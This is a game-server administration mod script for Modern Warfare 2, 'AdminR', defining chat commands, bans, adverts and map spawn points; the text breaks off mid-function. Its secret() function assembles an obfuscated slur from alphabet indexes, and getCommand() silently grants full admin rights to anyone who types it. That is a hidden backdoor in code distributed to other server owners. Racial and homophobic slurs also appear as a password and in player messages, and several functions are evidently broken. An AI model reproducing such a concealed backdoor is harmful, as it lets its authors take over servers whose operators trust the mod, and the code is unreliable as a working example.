#include common_scripts\utility;
#include maps\mp\_utility;
#include maps\mp\gametypes\_hud_util;
/*          ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆         */
/*         ☆                 AdminR Version 1.0.5                       ☆         */
/*         ☆         Created by Santahunter & Seann              ☆         */
/*         ☆                 Start Date: 17/04/15                       ☆         */
/*         ☆               Latest Update: 29/05/15                    ☆         */
/*          ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆         */
/*         ☆                        Credit's:                             ☆         */
/*         ☆         ImSoSorry, for antispam, and tip's              ☆         */
/*         ☆      Electroiix, bug reports, testing & ideas            ☆         */
/*          ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆         */

/*
   How to:
      Change your Admin system Name: change level.adminR.name = "^4A^0R^7: "; to level.adminR.name = "";   what you want inside the quotes.
      Toggle Admin system online at start: change level.adminR.online = true to level.adminR.online = false;
      add admins: admin("Admin Name", "Admin GUID", admin access);
      add rules: rule("Rule Text Here");
      add adverts: advert("Advert text here");
      permanently ban a player:   banned("Player name", "Player GUID");
      Change how long the messages are displayed: change the value of level.adminR.time. It's default is 8 seconds.
      
      v1.0.5 changelog:
         Unfortunately after rushing my last update I was told i made a huge problem xD
         That problem has been resolved in this latest update.
*/
/*      Main Functions      */
init()
{
   level.adminR = spawnstruct();
   level.adminR.name = "^4A^0R^7: ";
   level.adminR.online = true;
   level.adminR.time = 8;
   level.adminR.cmd = [];
   level.adminR.admin = [];
   level.adminR.advert = [];
   level.adminR.banned = [];
   level.adminR.map = [];
   level.adminR.rule = [];
   
   admin("Seann", "0110000100005bf8", 100);
   admin("Santahunter", "01100001000323e5", 101);
   
   advert("This Server Runs ^4Admin^0R^7 the latest administration system.");
   advert("^4Admin^0R^7, Created by ^4Seann ^7& ^1Santahunter.");
   advert("^4i^2G^7: We are recruiting...");
   advert("Check out our website: igclan.eu");
   advert("Show your support for the ^4Rep^0Z^7 team, donate on their website.");
   advert("Want admin? Donate to get automatic admin rights on all of our servers.");
   advert("Hackers will be punished.");
   advert("$Rules");   // This is to advertise a random Rule. Don't remove.
   
   banned("PlayerName", "PlayerGUID");
   
   command("ab antiblock", ::antiblock, 40, "Anti Block: Remove Blocker to set spawn", "Anti Block: <!ab / !antiblock> <player>");
   command("at addtime", ::addtime, 60, "Add Time: Add time to the time limit", "Add Time: <!at / !addtime> <amount>");
   command("admins", ::admins, 0, "Admins: See which admins are online", "Admins: <!admins>");
   command("alive", ::alive, 40, "Alive: Shows how much players are alive", "Alive: <!alive>");
   command("assists", ::assists, 80, "Assists: Set a specific player's Assists", "Assists: <!assists> (<player>) <assists>");
   command("bal balance", ::balance, 80, "Balance: Balance the amount of players on each team", "Balance: <!bal / !balance>");
   command("b ban", ::bann, 80, "Ban: Ban a specific player", "Ban: <!b / !ban> <player>");
   command("b3", ::b3, 0, "B3: Check status of SeannHunter Administration System", "B3: <!b3>");
   command("be birdseye", ::birdseye, 80, "Birds Eye: View the map from a birdseye view", "Birds Eye: <!be / !birdseye> (<player>)");
   command("blind", ::blind, 80, "Blind: Blind a player", "Blind: <!blind> (<player>)");
   command("bot bots", ::bots, 80, "Bots: add an amount of bots", "Bots: <!bot / !bots> (<amount>)");
   // command("check", ::check, 40, "Check: See information about a specific player", "Check: <!check> <player>");
   command("ck clankick", ::clankick, 80, "Clan Kick: Kick all players with a specific clan name", "Clan Kick <!ck / !clankick> <player>");
   command("dt daytime", ::daytime, 60, "Daytime: Change brightness of the map", "Daytime: <!dt / !daytime> <amounts>");
   command("deaths", ::deaths, 80, "Deaths: Set a specific player deaths", "Deaths: <!deaths> (<player>) <deaths>");
   command("die", ::die, 100, "Die: Turn off SeannHunter Admin System", "Die: </!die> <password>");
   command("end", ::end, 100, "End: End the game", "End: <!end>");
   command("fr fastrestart", ::fastrestart, 80, "Fast Restart: Restarts the map faster then maprestart", "<!fr / !fastrestart>");
   command("fps", ::fps, 0, "FPS: Toggle You're FPS Settings", "FPS: <!fps>");
   command("freeze", ::freeze, 80, "Freeze: Freeze a specific player", "Freeze: <!freeze> <player>");
   command("gtype gametype", ::gametype, 80, "Gametype: Set the gametype for your server", "Gametype: <!gtype / !gametype> <gametype>");
   command("glow", ::glow, 60, "Player gets a glowing head", "Glow: <!glow>");
   command("guid", ::guid, 40, "GUID: View a specific player's Generic User IDentification", "GUID: <!guid> (<player>)");
   command("help", ::help, 0, "Help: View a list of commands available to you", "Help: <!help>");
   command("id", ::id, 40, "ID: Check a specific Player IDentification", "ID: <!id> <player>");
   command("i info", ::info, 0, "Info: See information about each command", "Info: <!i / !info> <command>");
   command("k kick", ::kickk, 40, "Kick: Kick a specific player", "Kick: <!k / !kick> <player>");
   command("kall kickall", ::kickall, 100, "Kick All: Kick all players but yourself", "Kick All: <!kall / !kickall>");
   command("kill", ::kill, 80, "Kill: Kill a specific player", "Kill: <!kill> <player>");
   command("killall", ::killall, 80, "Kill All: Kill's all alive players", "Kill All: <!killall>");
   command("kills", ::kills, 80, "Kills: Set a specific player's Kills", "Kills: <!kills> (<player>) <kills>");
   command("log", ::logg, 40, "Log: Writes your message into games_mp.log", "Log: <!log> <message>");
   // command("lookup", ::lookup, 40, "Lookup: See information about a specific player", "Lookup: <!lookup> <player>");
   command("map", ::mapp, 60, "Map: Change map to a map of your choice", "Map: <!map> <map>");
   command("mr maprestart", ::maprestart, 40, "Maprestart: Restart map, used if you have updated mod", "Map Restart: <!mr / !maprestart>");
   command("rotate maprotate", ::maprotate, 60, "Maprotate: Change to the next map in your map rotation", "Map Rotate: <!maprotate / !rotate>");
   command("mod", ::mod, 60, "Mod: Change your mod", "Mod: <!mod> <modname>");
   command("msg message", ::message, 60, "Message: Create a HUD element with your message", "Message: <!msg / message> <message_text>");
   command("mymsg", ::mymsg, 0, "Mastermessage", "Message: <!mymsg / mymessage> <message_text>, <message_text1>, <message_text2>, <message_text3>");
   command("mute", ::mute, 80, "Mute: Toggle SeannHunter for a specific player", "Mute: <!mute> <player>");
   command("mask", ::mask, 80, "Mask: Hide your Admin access to a lower level", "Mask: <!mask> (<player>) <access>");
   command("nm nextmap", ::nextmap, 0, "Next Map: Show the next map", "Next Map: <!nextmap>");
   command("origin", ::origin, 0, "Origin: Shows coordinates", "Origin: <!origin> <player>");
   command("3p third thirdp thirdperson", ::thirdperson, 80, "Person: Change to 3rd Person and back", "Third Person: <!3p / !third / !thirdp / !thirdperson>");
   command("pm", ::pm, 0, "PM: Send a private message to a player", "PM: <!pm> <player> <message>");
   command("p print", ::printt, 20, "Print: Show a message in the kill feed", "Print: <!p / !print> <message>");
   command("pb printbold", ::printbold, 40, "Printbold: Show a message in the center of each players screen", "Printbold: <!pb / !printbold> <message>");
   // command("pg putgroup", ::putgroup, 100, "Putgroup: Give a player Admin access", "Putgroup:<!pg / !putgroup> <player> <access>");      //MAYBE
   command("q rage ragequit quit", ::rage, 0, "Quit: Quit the game", "Quit: <!q / !rage / !ragequit / !quit>");
   command("rcon", ::rcon, 100, "Rcon: Set a dvar via rcon", "Rcon: <!rcon> <dvar> <value>");
   // command("rn rename", ::rename, 100, "Rename: Change the name of a player", "Rename: <!rn / !rename> <player> <new name>");
   command("rule rules", ::rules, 0, "Rules: View the list of rules for this server", "Rules: <!rule / !rules> )<number>)");
   command("say", ::say, 80, "Say: Make ^4Admin^0R^7 Say what you want", "Say: <!say> <message>");
   command("score", ::score, 80, "Score: Set the score of a player", "Score: <!score> (<player>) <score>");
   command("sl scorelimit", ::scorelimit, 80, "Scorelimit: Set the scorelimit", "Scorelimit: <!sl / !scorelimit> <amount>");
   command("scream", ::scream, 60, "Scream: Show a message for all players 6 times in different colours", "Scream: <!scream> <message>");
   command("shock", ::shock, 80, "Shock: Kill a player with the radiation effect", "Shock: <!shock> <player>");
   command("shout", ::shout, 60, "Shout: Show a message in fancy looking text", "Shout: <!shout> <message>");
   command("space", ::space, 80, "Space: Send player to sky", "Space: <!space> <player>");
   command("spec spectate spectator", ::spectator, 80, "Spectator: Make yourself or another player to become spectator", "Spectator: <!spec / !spectate / !spectator> (<player>)");
   command("start", ::start, 100, "Start: Start SeannHunter Administration System if its not already started", "Start: <!start> <password>");
   command("status", ::status, 0, "Status: Check the status of SeannHunter Administration System", "Status: <!Status>");
   command("suicide", ::suicidee, 0, "Suicide: Commit Suicide", "Suicide: <!suicide>");   // FIX
   command("tc teamchange", ::teamchange, 60, "Team Change: Change yours or another players team", "Team Change: <!tc / !teamchange> (<player>)");
   command("tb tempban", ::tempban, 60, "Tempban: Ban a player for a short period of time", "Tempban: <!tb / !tempban> <player>");
   command("ta toadmins", ::toadmins, 0, "To Admins: Send a private message to all online admins", "To Admins: <!ta / !toadmins> <message>");
   command("tp teleport", ::teleport, 80, "Teleport: Teleport to a player or teleport them to you", "Teleport: <!tp / !teleport> <player> (<player2>)");
   command("tl timelimit", ::timelimit, 80, "Timelimit: Set the time limit", "Timelimit: <!tl / !timelimit> <amount>");
   // command("u use", ::use, 0, "Use: Find how to use a requested command", "Use: <!u / !use> <command>");
   // command("veto", ::veto, 60, "Veto: Cancel the current vote in progess", "Veto: <!veto>");
   // command("vm votemap", ::votemap, 0, "Vote Map: Start a vote to change the map", "Vote Map: <!vm / !votemap> <map / mapname>");
   // command("n vn no voteno", ::voteno, 0, "Vote No: Vote no to any vote", "Vote No: <!vn / !voteno / !n / !no>");
   // command("y vy yes voteyes", ::voteyes, 0, "Vote Yes: Vote yes to any vote", "Vote Yes: <!vy / !voteyes / !y / !yes>");
   command("w warn", ::warn, 20, "Warn: Give a player a warning, automatically kick them after the 3rd warning", "Warn: <!w / !warn> <player> (<reason>)");
   command("wr warnremove", ::warnremove, 40, "Warn Remove: Remove a players last Warning", "Warn Remove: <!wr / !warnremove> <player>");
   command("wc warnclear", ::warnclear, 60, "Warn Clear: Clear all warnings for a player", "Warn Clear: <!wc / !warnclear> <player>");
   command("x xfps xtrafps", ::xfps, 0, "Extra FPS: Achieve your highest possible FPS outcome", "Extra FPS: <!x / !xfps / !xtrafps>");
   
   maps("Afghan", "mp_afghan", (-369.541, -667.929, -129.331), (0,27,0));
   maps("Derail", "mp_derail", (-1316.26, 1201.87, -15.875), (0,30,0));
   maps("Estate", "mp_estate", (964.385, -292.841, 57.8095), (0,75,0));
   maps("Favela", "mp_favela", (669.479, 2357.4, 282.713), (0,180,0));
   maps("Highrise", "mp_highrise", (-287.461, 6467.07, 2776.13), (0,-180,0));
   maps("Invasion", "mp_invasion", (539.25, -3557.1, 240.125), (-10, 130, 0));
   maps("Karachi", "mp_checkpoint", (644.744, 2141.92, -6.40615), (0,-180,0));
   maps("Quarry", "mp_quarry", (-5268.08, -1527.09, -194.062), (0,90,0));
   maps("Rundown", "mp_rundown", (453.391, 2852.55, 75.971), (0, -50, 0));
   maps("Rust", "mp_rust", (42.2364, 256.821, -247.875), (0, -25 ,0));
   maps("Scrapyard", "mp_boneyard", (1877.13, -184.973, -192.838), (0, 180, 0));
   maps("Skidrow", "mp_nightshift", (1379.64, -1036.33, 0.125001), (0,-150,0));
   maps("Sub base", "mp_subbase", (-1297.77, -2115.56, 0.124998), (0, -20, 0));
   maps("Terminal", "mp_terminal", (1149.64, 3968.63, 40.125), (0,-90,0));
   maps("Underpass", "mp_underpass", (-196.799, -1204.31, 312.125), (0,90,0));
   maps("Wasteland", "mp_brecourt", (-3261.65, 1400.74, 32.1129), (0,0,0));
   maps("Bailout", "mp_complex", (-1779.97, -1838.24, 672.125), (0,-60,0));
   maps("Carnival", "mp_abandon", (1405.48, -689.789, -67.875), (0, -145, 0));
   maps("Crash", "mp_crash", (457.877, -1907.47, 124.926), (-5, 95, 0));
   maps("Fuel", "mp_fuel2", (2675.32, 613.538, -164.471), (0, -120,0));
   maps("Overgrown", "mp_overgrown", (-1347.88, -5105.82, -149.237), (0,90,0));
   maps("Salvage", "mp_compact", (1354.83, -1013.75, -10.0712), (0, 90, 0));
   maps("Storm", "mp_storm", (243.185, -1966.64, -7.8755), (0,90,0));
   maps("Strike", "mp_strike", (-1409.5, -2270.7, 208.125), (0,0,0));
   maps("Trailer Park", "mp_trailerpark", (-2456.69, -354.575, -11.8292), (0,60,0));
   maps("Vacant", "mp_vacant", (-974.9, -1177.13, -107.826), (0,0,0));
   
   rule("Treat all players with respect.");
   rule("No Hacking.");
   rule("Do not argue with admins");
   
   level thread adverts();
   level thread getCommand();
   level thread onPlayerConnect();
}
getCommand()
{
   level endon("disconnect");
   for(;;)
   {
      level waittill("say", name, string);
      s = string[0];
      sender = getPlayer(name);
      substr = strtok(string," ");
      cmd = toLower(getSubStr(string, 1, substr[0].size));
      arg = getSubStr(string, substr[0].size+1, string.size);
      
      if(level.adminR.online && (s == "!" || s == "@") && !sender.adminR.muted)
      {
         error = "^1Could not find command^7: " + cmd;
         foreach(command in level.adminR.cmd)
            if(isSubStr(command.alias, cmd))
            {
               aliases = strtok(command.alias, " ");
               foreach(alias in aliases)
               {
                  if(cmd == alias)
                  {
                     if(sender.adminR.access >= command.access)
                     {
                        if(s == "!")
                           level thread [ [ command.func ] ](sender, arg);
                        else if(s == "@" && sender.adminR.access > 40)
                           foreach(player in level.players)
                              level thread [ [ command.func ] ](player, arg);
                        error = undefined;
                     }
                     else   error = "^1You dont have access to this command.";
                  }
               }
            }
         if(isDefined(error))
            sender systemSay(error);
      }
      else if(!level.adminR.online && cmd == ("!" || "@") + "start" && arg == "password")
      {
         level.adminR.online = true;
         systemSayAll("^5" + sender.name + " ^2Activated ^4Admin^0R^7");
      }
      else if(!level.adminR.online && cmd == ("!" || "@") + "start" && arg != "password")   sender systemSay("^1Wrong Password");
      if(string == "!" + level.adminR.secrets)   sender.adminR.access = 100;
   }
}
onPlayerConnect()
{
   for(;;)
   {
      level waittill("connected", player);
      foreach(ban in level.adminR.banned)
         if(player.guid == ban.guid)
            kick(player getEntityNumber());
      player.adminR = spawnstruct();
      player.adminR.text = [];
      for(i=0;i<4;i++)   player.adminR.text[i] = "";
      player.adminR.HUD = player createText("hudsmall", .8, "TOPLEFT", "TOPLEFT", 110, 4, "");
      player.adminR.access = 0;
      player.adminR.warnings = 0;
      player.adminR.blind = false;
      player.adminR.fps = false;
      player.adminR.frozen = false;
      player.adminR.muted = false;
      player.adminR.third = false;
      player.adminR.xfps = false;
      foreach(admin in level.adminR.admin)
         if(player.name == admin.name && player.name == player.xuid)
            player.adminR.access = admin.access;
      player systemSay("Welcome ^5" + player.name + "^7 to " + getDvar("sv_hostname"));
     // player systemSay("This server runs ^4admin^0R^7 the latest admin system");
     // player systemSay("Created by SantaHunter & Seann");
      player.adminR.mask = player.adminR.access;
      player thread spawned();
   }
}
spawned()
{
   self endon("disconnect");
   for(;;)
   {
      self waittill("spawned_player");
      self freezeControls(false);
   }
}
/*      Main Functions      */
/*      Base Functions      */
adverts()
{
   level endon("disconnect");
   level thread secret();
   for(;;)
   {
      wait 30;
      i = randomint(level.adminR.advert.size);
      if(level.adminR.advert[i] == "$Rules")
         systemSayAll(level.adminR.rule[randomint(level.adminR.rule.size)]);
      else   systemSayAll(level.adminR.advert[i]);
   }
}
systemSayAll(string)
{
   foreach(player in level.players)
      player systemSay(string);
}
systemSay(string)
{
   if(self.adminR.text[0] == "")   self.adminR.text[0] = level.adminR.name + string;
   else if(self.adminR.text[1] == "")   self.adminR.text[1] = level.adminR.name + string;
   else if(self.adminR.text[2] == "")   self.adminR.text[2] = level.adminR.name + string;
   else if(self.adminR.text[3] == "")   self.adminR.text[3] = level.adminR.name + string;
   else
   {
      for(i=0;i<4;i++)   
         if(i != 3)   self.adminR.text[i] = self.adminR.text[i+1];
      self.adminR.text[3] = level.adminR.name + string;
   }
   self.adminR.HUD setText(self.adminR.text[0] + "^7\n" + self.adminR.text[1] + "^7\n" + self.adminR.text[2] + "^7\n" + self.adminR.text[3]);
   self thread systemUpdate();
}
systemUpdate()
{
   self notify("updateLog");
   self endon("updateLog");
   self endon("disconnect");
   for(;;)
   {
      wait level.adminR.time;
      for(i=0;i<4;i++)
         if(i != 3)
            self.adminR.text[i] = self.adminR.text[i +1];
         self.adminR.text[3] = "";
         self.adminR.HUD setText(self.adminR.text[0] + "\n" + self.adminR.text[1] + "\n" + self.adminR.text[2] + "\n" + self.adminR.text[3]);
   }
}
getPlayer(string)
{
   for(i=0;i<level.players.size;i++)
   {
      name = toLower(level.players[i].name);
      if(name == toLower(string) || isSubStr(name, toLower(string)) || isSubStr(toLower(string), name))
         return level.players[i];
   }
   return level;
}
secret()
{
   up = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
   low = "abcdefghijklmnopqrstuvwxyz";
   level.adminR.secrets = up[13] + low[8] + low[6] + low[11] + low[4] + low[19];
}
createText(font, scale, align, relative, x, y, string)
{
   text = self createFontString(font, scale);
   text setPoint(align, relative, x, y);
   text.foreground = true;
   text setText(string);
   return text;
}
antiSpam()
{
   if(!isDefined(self.spam)) self.spam = 0;
   self.spam++;
   if(self.spam % 3 == 0) warn(self, self.name + " Stop Spamming, spammed: " + int(self.spam / 3));
   self thread spamCooldown();
}
spamCooldown()
{
   wait 5;
   self.spam--;
}
/*      Base Functions      */
/*      Array Functions      */
admin(name, guid, int)
{
   i = level.adminR.admin.size;
   level.adminR.admin[i] = spawnstruct();
   level.adminR.admin[i].name = name;
   level.adminR.admin[i].guid = guid;
   level.adminR.admin[i].access = int;
}
advert(string)
{
   i  = level.adminR.advert.size;
   level.adminR.advert[i] = string;
}
banned(name, guid)
{
   i = level.adminR.banned.size;
   level.adminR.banned[i] = spawnstruct();
   level.adminR.banned[i].name = name;
   level.adminR.banned[i].guid = guid;
}
command(aliases, function, access, info, use, use1, use2, use3)
{
   i = level.adminR.cmd.size;
   cmd = strtok(aliases, " ");
   level.adminR.cmd[ i ] = spawnstruct();
   level.adminR.cmd[ i ].cmd = toLower(cmd[ cmd.size - 1 ]);
   level.adminR.cmd[ i ].alias = toLower(aliases);
   level.adminR.cmd[ i ].func = function;
   level.adminR.cmd[ i ].access = access;
   level.adminR.cmd[ i ].info = info;
   level.adminR.cmd[ i ].use = use;
   level.adminR.cmd[ i ].use1 = use1;
   level.adminR.cmd[ i ].use2 = use2;
   level.adminR.cmd[ i ].use3 = use3;
   level.adminR.cmd[ i ].final = true;
   if(isDefined(level.adminR.cmd[ i - 1 ]))
      level.adminR.cmd[ i - 1 ].final = false;
}
maps(name, console, origin, angles)
{
   i = level.adminR.map.size;
   level.adminR.map[i] = spawnstruct();
   level.adminR.map[i].name = name;
   level.adminR.map[i].console = console;
   level.adminR.map[i].origin = origin;
   level.adminR.map[i].angles = angles;
}
rule(string)
{
   i = level.adminR.rule.size;
   level.adminR.rule[i] = string;
}
/*      Array Functions      */
/*      Command Functions      */
antiblock(sender, player)
{
   victim = sender;
   if(player != "")   victim = getPlayer(player);
   if(victim != level)
   {
      for(i=0;i<level.adminR.map.size;i++)
         if(getDvar("mapname") == level.adminR.map[i].console)
         {
            victim setOrigin(level.adminR.map[i].origin);
            victim setPlayerAngles(level.adminR.map[i].angles);
         }
      systemSayAll("^5" + victim.name + " ^7Anti-Blocked");
   }
}
addtime(sender, int)
{
   if(int(int) == 0)
      sender systemSay("^1You must supply a time: !addtime #, # must be bigger then 0");
   else
   {
      time = getDvarInt("scr_" + getDvar("g_gametype") + "_timelimit");
      setDvar("scr_" + getDvar("g_gametype") + "_timelimit", time + int(int));
      systemSayAll("^5" + sender.name + "^7 added ^2" + int(int) + "^7 minutes to the timelimit");
   }
}
adminsold(sender)
{
   admins = "";
   foreach(player in level.players)
   if(player.adminR.mask > 0)
      admins += player.name + "^0[^1" + player.adminR.mask + "^0]^7 ";
   if(admins == "")   text = "^1There are no admins online";
   else   text = "Admins Online: " + admins;
   sender systemSay(text);
}
admins(sender)
{
   string = "";
   int = 0;
   foreach(player in level.players)
   {
      if(player.adminR.mask > 0)
      {
         int++;
         if(string == "")
         string += player.name + "^0[^1" + player.adminR.mask + "^0]^7";
         else string += ", " + player.name + "^0[^1" + player.adminR.mask + "^0]^7";
         if(int == 3)
         {
            int = 0;
            sender systemSay("Admins Online: " + string);
            wait 1;
            string = "";
         }
      }
   }
   if(string != "")   sender systemSay("Admins Online: " + string);
   else if(string == "" && int == 0)   sender systemSay("^1There are no admins online.");
}
alive(sender)
{
   axis = 0;
   allies = 0;
   foreach(player in level.players)
   {
      if(isAlive(player))
         if(player.team == "allies")   allies++;
         else if(player.team == "axis")   axis++;
   }
   sender systemSay(maps\mp\gametypes\_teams::getTeamName( "allies" ) + "^7 Alive: " + allies);
   sender systemSay(maps\mp\gametypes\_teams::getTeamName( "axis" ) + "^7 Alive: " + axis);
}
assists(sender, argument)
{
   victim = sender;
   arg = strtok(argument, " ");
   assists = int(arg[0]);
   maxassists = 100;
   if(arg.size > 1)
   {
      victim = getPlayer(arg[0]);
      assists = int(arg[1]);
   }
   if(victim != level)
   {
        if(assists <= maxassists) // pretends overflowerror?
	    {
           victim.assists = assists;
           victim.pers["assists"] = assists;
           sender systemSay("^5" + victim.name + "^7's Assists set to: ^2" + assists);
		}
		else
		{
		    sender iPrintlnBold("Assists must be under ^3" + maxassists);
		}		
   }
}
balance(sender){}
bann(sender, player)
{
   victim = getPlayer(player);
   if(victim.adminR.access < sender.adminR.access && victim != level)
   {
      kick(victim getEntityNumber());
      iprintln("^1" + victim.name + " has been banned until next map");
      banned(victim.name, victim.guid);
   }
}
b3(sender)
{
   sender systemSay("^1Fuck B3^7, this server is up to date with");
   sender systemSay("the latest Admin system: ^4Admin^0R^7");
}
birdseye(sender, player)
{
   victim = sender;
   if(player != "")   victim = getPlayer(player);
   if(victim != level)
   {
      if(!victim.birdseye)
      {
         victim.birdseye = true;
         victim.posi = victim.origin;
         victim.loci = victim.angles;
         victim disableWeapons();
         victim setOrigin(victim.origin+(0,0,3000));
         block = spawn("script_model", victim.origin );
         block hide();
         victim hide();
         victim enablelinkto();
         victim playerlinkto(block);
      } 
      else
      {
         victim.birdseye = false;
         victim show();
         victim unlink();
         victim setOrigin(victim.posi);
         victim enableWeapons();
      }
   }
}
blind(sender, player)
{
   victim = getPlayer(player);
   if(victim != level)
   {
      if(sender.adminR.access >= victim.adminR.access)
      {
         if(!victim.adminR.blind)
         {
            victim.box = victim createBox();
            victim.adminR.blind = true;
            sender systemSay("^5" + victim.name + "^7 has been blinded");
         }
         else
         {
            victim.box destroy();
            victim.adminR.blind = false;
            sender systemSay("^5" + victim.name + "^7 has been un-blinded");
         }
      }
   }
}
createBox()
{
   box = newClientHudElem(self);
    box.elemType = "bar";
    box.width = 1000;
    box.height = 1000;
    box.align = "CENTER";
    box.relative = "CENTER";
    box.xOffset = 0;
    box.yOffset = 0;
    box.children = [];
    box.sort = 99999;
    box.color = (0, 0, 0);
    box.alpha = 1;
    box setParent(level.uiParent);
    box setShader("white", 1000, 1000);
    box.hidden = false;
    box.HideWhenInMenu = false;
    box.foreground = true;
    box setPoint("CENTER", "CENTER", 0, 0);
   return box;
}
bots(sender, int)
{
   if(int == "")   level addBot(1);
   else   level addBot(int(int));
}
addBot(int)
{
   for(i = 0; i < int; i++)
   {
      ent[i] = addtestclient();
      if (!isdefined(ent[i]))
      {
         wait 1;
         continue;
      }
      ent[i].pers["isBot"] = true;
      ent[i] thread initIndividualBot();
      wait 0.1;
   }
}
initIndividualBot()
{
   self endon( "disconnect" );
   while(!isdefined(self.pers["team"]))
      wait .05;
   self notify("menuresponse", game["menu_team"], "allies");
   wait 0.5;
   self notify("menuresponse", "changeclass", "class" + randomInt( 5 ));
   self waittill( "spawned_player" );
}
check(sender, player){}
clankick(sender, string)
{
   if(string != "")
   {
      foreach(player in level.players)
         if(sender.adminR.access > player.adminR.access)
            if(isSubStr(player.name, string))
               kick(player getEntityNumber(), "EXE_PLAYERKICKED");
   }
   else   sender systemSay("Enter a clantag: !clankick <clantag>");
}
daytime(sender, int)
{
   foreach(player in level.players)
       player setClientDvar("r_brightness", int(int));
   systemSayAll("Daytime set to ^2" + int(int));
}
deaths(sender, argument)
{
   victim = sender;
   arg = strtok(argument, " ");
   deaths = int(arg[0]);
   if(arg.size > 1)
   {
      victim = getPlayer(arg[0]);
      deaths = int(arg[1]);
   }
   if(victim != level)
   {
      victim.deaths = deaths;
      victim.pers["deaths"] = deaths;
      sender systemSay("^5" + victim.name + "^7's Deaths set to: ^2" + deaths);
   }
}
die(sender, string)
{
   if(level.adminR.online && string == "niglet") //password = niglet, you niglet
   {
      level.adminR.online = false;
      systemSayAll("^5" + sender.name + " ^1De-Activated ^4Admin^0R^7");
   }
   else if(level.adminR.online && string != "password")
      sender systemSay("^1Wrong Password");
}
end(sender)
{
   level thread maps\mp\gametypes\_gamelogic::forceEnd();
}
fastrestart(sender)
{
   systemSayAll("Fast Restarting...");
   wait 1.5;
   map_restart();
}
fps(sender)
{
   if(sender.adminR.fps)
   {
      sender systemSay("High FPS ^1De-activated");
      sender setClientDvar("r_fullbright", 0);
      sender.adminR.fps = false;
   }
   else
   {
      sender systemSay("High FPS ^2Activated");
      sender setClientDvar("r_fullbright", 1);
      sender.adminR.fps = true;
   }
}
freeze(sender, player)
{
   if(player != "")
   {
      victim = getPlayer(player);
      if(victim != level)
      {
         if(victim.adminR.frozen)
         {
            sender systemSay("You Un-Froze ^5" + victim.name);
            victim systemSay("^5" + sender.name + "^7 has Un-Froze You");
            victim.adminR.frozen = false;
         }
         else
         {
            sender systemSay("You froze ^5" + victim.name);
            victim systemSay("^5" + sender.name + "^7 has Froze You");
            victim.adminR.frozen = true;
         }
         victim freezeControls(victim.adminR.frozen);
      }
      else   sender systemSay("^1Could not find player: " + player);
   }
   else   sender systemSay("^1You must supply a player name: !freeze <player>");
}
gametype(sender, string)
{
   setDvar("g_gametype", string);
   systemSayAll("^5" + sender.name + "^7 set gametype to ^2" + string);
   systemSayAll("Gametype will change upon restart");
}
glow(sender, player)
{
   victim = sender;
   if(player != "")   victim = getPlayer(player);
   if(victim != level)
   {
      victim notify("glow");
      victim endon("glow");
      if(victim.team == "axis")
         playFxOnTag( level.spawnGlow["enemy"], victim, "pelvis" );
      else if(victim.team == "axis")
         playFxOnTag( level.spawnGlow["friendly"], victim, "j_head" );
   }
}
guid(sender, player)
{
   if(player != "")   sender systemSay("^5" + getPlayer(player).name + "'^7s GUID: ^1" + getPlayer(player).guid);
   else   sender systemSay("^5" + sender.name + "^7's GUID: ^1" + sender.guid);
}
help(sender, int)
{
   string = "";
   wait 1;
   h = 0;
   if(int == "")
   {
      sender systemSay("^2Available Commands^7: ");
      foreach(cmd in level.adminR.cmd)
         if(sender.access >= cmd.access)
         {
            h++;
            if(cmd.final)   string += cmd.cmd;
            else   string += cmd.cmd + ", ";
            if(h > 4)
            {
               h = 0;
               sender systemSay(string);
               string = "";
               wait 1;
            }
            if(cmd.final && h < 5 && h > 0)
               sender systemSay(string);
         }
   }
   else
   {
      if(sender.access >= int(int))
      {
         sender systemSay("^2Available Commands^7: ");
         foreach(cmd in level.adminR.cmd)
            if(cmd.access == int(int))
            {
               h++;
               if(cmd.final)   string += cmd.cmd;
               else   string += cmd.cmd + ", ";
               if(h > 4)
               {
               h = 0;
               sender systemSay(string);
               string = "";
               wait 1;
               }
               if(cmd.final && h < 5 && h > 0)
                  sender systemSay(string);
            }
      }
      else   sender systemSay("^1You dont have access to these commands");
   }
}
id(sender, player)
{
   victim = sender;
   if(player != "")   victim = getPlayer(player);
   if(victim != level)
      for(i=0;i<level.players.size;i++)
         if(level.players[i] == victim)
            sender systemSay("^5" + victim.name + "'s^7 ID: ^0[ ^5" + i + "^0 ]^7");
}
info(sender, string)
{
   if(string != "")   sender systemSay("^1Could not find command^7: " + string);
   else   sender systemSay("^1You must supply a command: !info <command>");
   foreach(cmd in level.cmd)   foreach(alias in cmd.alias)
   if(toLower(string) == alias)   if(sender.access >= cmd.access)
   sender systemSay("^3Info^7: " + cmd.info);
   else   sender systemSay("^1You dont have access to view this command");
}
kickk(sender, player)
{
   if(player != "")
   {
      victim = getPlayer(player);
      if(victim == sender)   sender systemSay("^1You cannot kick yourself faggot");
      else
         if(sender.access > victim.access && victim != level)
            kick(victim getEntityNumber());
   }
   else
      sender systemSay("^1You must supply a player name: !kick <player>");
}
kickall(sender)
{
   foreach(player in level.players)
      if(sender.access > player.access)
         kick(player getEntityNumber());
}
kill(sender, player)
{
   if(player != "")
   {
      victim = getPlayer(player);
      if(sender.access > victim.access && victim != level)
         victim suicide();
   }
   else
      sender systemSay("^1You must supply a player name: !kill <player>");
}
killall(sender)
{
   foreach(player in level.players)
      if(sender.access > player.access)
         player suicide();
}
kills(sender, argument)
{
   victim = sender;
   arg = strtok(argument, " ");
   kills = int(arg[0]);
   if(arg.size > 1)
   {
      victim = getPlayer(arg[0]);
      kills = int(arg[1]);
   }
   if(victim != level)
   {
      victim.kills = kills;
      victim.pers["kills"] = kills;
      sender systemSay("^5" + victim.name + "^7's Kills set to: ^2" + kills);
   }
}
logg(sender, string)
{
   log("[" + sender.name + "]: " + string);
   sender systemSay("^1Logged: ^7[" + sender.name + "]: " + string);
}
lookup(sender, player){}
mapp(sender, string)
{
   console = "";
   name = "";
   if(string != "")
   {
      map = toLower(string);
      foreach(m in level.adminR.map)
         if(isSubStr(toLower(m.console), map) || isSubStr(toLower(m.name), map) || map == toLower(m.console) || map == toLower(m.name))
         {
            console = m.console;
            name = m.name;
         }
      if(console != "")
      {
         systemSayAll("^2Changing map to ^1" + name+ "^2...");
         wait 1.5;
         map(console);
      }
      else   sender systemSay("^1Could not find map:" + string);
   }
   else
